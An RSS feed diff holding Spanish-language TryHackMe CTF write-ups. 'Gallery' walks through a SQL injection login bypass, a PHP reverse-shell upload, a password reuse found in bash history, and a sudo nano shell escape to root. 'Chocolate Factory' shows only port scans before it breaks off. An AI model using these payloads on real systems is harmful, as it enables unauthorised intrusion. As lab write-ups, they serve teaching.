@@ -1,0 +1,902 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>vi on d3b0o</title>
+        <link>https://d3b0o.github.io/tags/vi/</link>
+        <description>Recent content in vi on d3b0o</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Wed, 21 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/tags/vi/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Gallery</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/</link>
+        <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/1.png" alt="Featured image of post Resolución Gallery" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/chocolatefactory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/chocolatefactory&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.250.47&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.250.47
+PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data.
+64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms
+
+--- 10.10.250.47 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -Pn -vvv -n 10.10.110.190 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.110.190
+   5   │     [*] Open ports: 80,8080
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p80,8080 -sC -sV 10.10.110.190 -oN target
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Simple Image Gallery System
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
+&lt;p&gt;Con el whatweb podemos ver más información de la web&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ whatweb 10.10.110.190
+http://10.10.110.190 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.110.190], Title[Apache2 Ubuntu Default Page: It works]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;buscando-subdirectorios&#34;&gt;Buscando subdirectorios&lt;/h3&gt;
+&lt;p&gt;Con wfuzz vamos a fuzzear mediante el dicionario &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; para encontrar subdirectorios&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wfuzz -c -t 200 --hc=404 --hh=42126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.151.26/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos reporta el directorio &lt;strong&gt;/gallery&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;gallery&#34;&gt;/gallery&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login.png&#34;
+	width=&#34;509&#34;
+	height=&#34;371&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/login_hu5cfa5e12c6956a57c27f6c93754adb0c_18005_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;329px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Al entrar nos lleva a &lt;code&gt;/gallery/login.php&lt;/code&gt; y vemos un panel para iniciar sessión, primero comprobamos si admin:admin funciona, pero no. Podemos probar con usuario &lt;code&gt;&#39; or 1 = 1-- -&lt;/code&gt; y cualquier contraseña y ya nos entra&lt;/p&gt;
+&lt;h4 id=&#34;admin&#34;&gt;Admin&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel.png&#34;
+	width=&#34;1234&#34;
+	height=&#34;544&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/admin-panel_hub0df3afe1af927c1129dd46afaa77a43_112470_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;544px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora estamos dentro de la cuenta de administrador y podemos ver los álbums, Al entrar dentro de uno vemos que nos deja subir fotos nuevas.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images.png&#34;
+	width=&#34;1217&#34;
+	height=&#34;425&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/sample-images_hu6e0f5c9916f0c6b48464a715e6e29bf1_160607_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;286&#34;
+		data-flex-basis=&#34;687px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Al probar de subir un .php no lo acepta, con burpsuite he probado con un diccionario de extensiones y solo acepta extensiones de fotos&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile.png&#34;
+	width=&#34;1114&#34;
+	height=&#34;304&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-gallery/images/profile_hu2f9218f1fc3144225108cd74fe098bfa_18219_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;366&#34;
+		data-flex-basis=&#34;879px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Dentro de la configuración del perfil del admin, hay un apartado para cambiar la foto. El mensaje, dice, &lt;code&gt;selecciona un archivo&lt;/code&gt;. Podemos intentar mandarle un archivo .php para mandarnos una reverse shell&lt;/p&gt;
+&lt;h2 id=&#34;intrusión&#34;&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;Vamos a intentar subir un archivo php de &lt;code&gt;pentestmonkey&lt;/code&gt; para la reverse shell: &lt;a class=&#34;link&#34; href=&#34;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Es importante cambiar las líneas de ip y port y poner la ip de nuestra máquina y el puerto por el que nos vamos a poner en escucha con netcat (443)&lt;/p&gt;
+&lt;p&gt;Ahora ya podemos subir el archivo y al darle a update, recibimos a reverse shell&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;h3 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h3&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;mike&#34;&gt;Mike&lt;/h3&gt;
+&lt;p&gt;Si vamos a /home/mike podemos ver que hay un archivo llamado &lt;strong&gt;user.txt&lt;/strong&gt; el cual debe contener la flag de usuario, Pero no tenemos permisos para leerlo ni para entrar en la carpeta &lt;strong&gt;Documents&lt;/strong&gt; e &lt;strong&gt;Images&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Después de estar un rato buscando he encontrado que en &lt;code&gt;/var/backups&lt;/code&gt; hay una carpeta llamada mike_home_backup en la cual están los archivos de mike y tenemos permisos para leerlos.&lt;/p&gt;
+&lt;p&gt;Dentro de &lt;strong&gt;Documents&lt;/strong&gt; hay un archivo con 3 contraseñas de otras webs con el usuario mike, he probado si alguna de estas sirve para esta máquina pero no.&lt;/p&gt;
+&lt;p&gt;En &lt;strong&gt;Images&lt;/strong&gt;, hay 3 fotos las cuales he mirado si tenían algún archivo oculto pero no&lt;/p&gt;
+&lt;p&gt;Con un ls -a podemos ver que hay un historial &lt;code&gt;.bash_history&lt;/code&gt;con un cat podemos ver su contenido, dentro hay un comando en el que parece especificar una contraseña: &lt;code&gt;sudo -lb3stpassw0rdbr0xx&lt;/code&gt; con el comando &lt;code&gt;su mike&lt;/code&gt; y proporcionando la contraseña &lt;code&gt;b3stpassw0rdbr0xx&lt;/code&gt; ya somos mike&lt;/p&gt;
+&lt;p&gt;Ya podemos ver la flag&lt;/p&gt;
+&lt;h3 id=&#34;root&#34;&gt;Root&lt;/h3&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; Podemos ver que puede ejecutar lo siguiente como root sin contraseña &lt;code&gt;/bin/bash /opt/rootkit.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Al ejecutar &lt;code&gt;sudo /bin/bash /opt/rootkit.sh&lt;/code&gt; y le damos a read nos abre un archivo con un texto muy largo. Como estamos ejecutando nano como root podemos probar con &lt;code&gt;ctrl + r&lt;/code&gt;, &lt;code&gt;ctrl + x&lt;/code&gt; y escribiendo reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0, ya somos root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución Chocolate Factory</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/</link>
+        <pubDate>Tue, 13 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/1.jpg" alt="Featured image of post Resolución Chocolate Factory" /&gt;&lt;p&gt;Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/chocolatefactory&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/chocolatefactory&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.250.47&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.250.47
+PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data.
+64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms
+
+--- 10.10.250.47 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h2 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h2&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort
+PORT    STATE SERVICE    REASON
+21/tcp  open  ftp        syn-ack ttl 63
+22/tcp  open  ssh        syn-ack ttl 63
+80/tcp  open  http       syn-ack ttl 63
+100/tcp open  newacct    syn-ack ttl 63
+101/tcp open  hostname   syn-ack ttl 63
+102/tcp open  iso-tsap   syn-ack ttl 63
+103/tcp open  gppitnp    syn-ack ttl 63
+104/tcp open  acr-nema   syn-ack ttl 63
+105/tcp open  csnet-ns   syn-ack ttl 63
+106/tcp open  pop3pw     syn-ack ttl 63
+107/tcp open  rtelnet    syn-ack ttl 63
+108/tcp open  snagas     syn-ack ttl 63
+109/tcp open  pop2       syn-ack ttl 63
+110/tcp open  pop3       syn-ack ttl 63
+111/tcp open  rpcbind    syn-ack ttl 63
+112/tcp open  mcidas     syn-ack ttl 63
+113/tcp open  ident      syn-ack ttl 63
+114/tcp open  audionews  syn-ack ttl 63
+115/tcp open  sftp       syn-ack ttl 63
+116/tcp open  ansanotify syn-ack ttl 63
+117/tcp open  uucp-path  syn-ack ttl 63
+118/tcp open  sqlserv    syn-ack ttl 63
+119/tcp open  nntp       syn-ack ttl 63
+120/tcp open  cfdptkt    syn-ack ttl 63
+121/tcp open  erpc       syn-ack ttl 63
+122/tcp open  smakynet   syn-ack ttl 63
+123/tcp open  ntp        syn-ack ttl 63
+124/tcp open  ansatrader syn-ack ttl 63
+125/tcp open  locus-map  syn-ack ttl 63
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.250.47
+   5   │     [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
+       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴──────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.10.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1631bbfb51fcccc12148ff0d833b0089b (RSA)
+|   256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA)
+|_  256 b44502b62478gea9065f6c79448a06555e (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+100/tcp open  newacct?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+101/tcp open  hostname?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+102/tcp open  iso-tsap?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+103/tcp open  gppitnp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+104/tcp open  acr-nema?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+105/tcp open  csnet-ns?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+106/tcp open  pop3pw?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+107/tcp open  rtelnet?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+108/tcp open  snagas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+109/tcp open  pop2?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
